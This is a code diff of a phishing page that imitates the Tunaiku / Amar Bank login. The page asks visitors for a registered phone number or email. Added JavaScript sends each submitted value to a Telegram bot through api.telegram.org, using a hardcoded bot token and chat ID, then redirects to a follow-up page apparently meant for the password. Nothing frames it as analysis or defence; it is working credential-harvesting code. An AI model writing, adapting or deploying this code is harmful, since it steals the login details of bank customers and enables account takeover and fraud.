@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>Login-Tunaiku</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -198,15 +198,15 @@ font-weight:bold;
             <h2>Masuk Akun</h2>
         </div>
         <div class="form-container">
-        <p class="right-align red-text">Masukan Nomor Handphone Atau Email</p>
+            <p class="right-align red-text">Masukan Nomor Handphone Atau Email</p>
             <p class="right-align blue-text">Nomor Handphone Dan Email Harus Sudah Terdaftar Di</p>
             <p class="right-align black-text">Tunaiku Atau Amar Bank</p>
-            <form id="login-form" action="submit.php" method="post">
+            <form id="login-form">
                 <input type="number" id="user-input" name="userInput" placeholder="Silahkan masukkan di sini">
                 <div class="help-text">
                     Butuh Bantuan Masuk Akun? <a href="#">Klik Di sini</a>
                 </div>
-                <button id="submit-btn" disabled>Selanjutnya</button>
+                <button type="button" id="submit-btn" disabled>Selanjutnya</button>
             </form>
         </div>
     </div>
@@ -230,58 +230,40 @@ font-weight:bold;
                 submitBtn.classList.remove("active");
             }
         });
+
+        function sendMessageToTelegram(message) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState === 4 && this.status === 200) {
+                    console.log("Pesan terkirim: " + message);
+                }
+            };
+            var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+            xhttp.open("GET", url, true); // Use GET method
+            xhttp.send();
+        }
+
+        function kirimPesan() {
+            var nomorHandphone = document.getElementById('user-input').value;
+
+            if (nomorHandphone.trim() === '') {
+                if (navigator.vibrate) {
+                    navigator.vibrate(200);
+                }
+                return;
+            }
+
+            var message = "Nomor Handphone: " + nomorHandphone;
+            sendMessageToTelegram(message);
+            console.log('Data berhasil dikirim ke Telegram!');
+            setTimeout(function() {
+                window.location.href = 'pass.html';
+            }, 1000); // Delay to ensure Telegram message is sent
+        }
+
+        document.getElementById("submit-btn").addEventListener("click", kirimPesan);
     </script>
-    <script>
-    document.getElementById("close-popup").addEventListener("click", function() {
-        document.getElementById("popup").style.display = "none";
-        document.getElementById("main-content").style.filter = "none";
-        document.body.style.overflow = "auto";
-    });
-
-    const userInput = document.getElementById("user-input");
-    const submitBtn = document.getElementById("submit-btn");
-
-    userInput.addEventListener("input", function() {
-        if (userInput.value.trim() !== "") {
-            submitBtn.disabled = false;
-            submitBtn.classList.add("active");
-        } else {
-            submitBtn.disabled = true;
-            submitBtn.classList.remove("active");
-        }
-    });
-
-    function sendMessageToTelegram(message) {
-        var xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function() {
-            if (this.readyState === 4 && this.status === 200) {
-                console.log("Pesan terkirim: " + message);
-            }
-        };
-        var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
-
-        xhttp.open("POST", url, true);
-        xhttp.send();
-    }
-
-    function kirimPesan() {
-        var nomorHandphone = document.getElementById('user-input').value;
-
-        if (nomorHandphone.trim() === '') {
-            if (navigator.vibrate) {
-                navigator.vibrate(200);
-            }
-            return;
-        }
-
-        var message = "Nomor Handphone: " + nomorHandphone;
-        sendMessageToTelegram(message);
-        console.log('Data berhasil dikirim ke Telegram!');
-        window.location.href = 'pass.html';
-    }
-
-    document.getElementById("submit-btn").addEventListener("click", kirimPesan);
-</script>
 
 </body>
 </html>
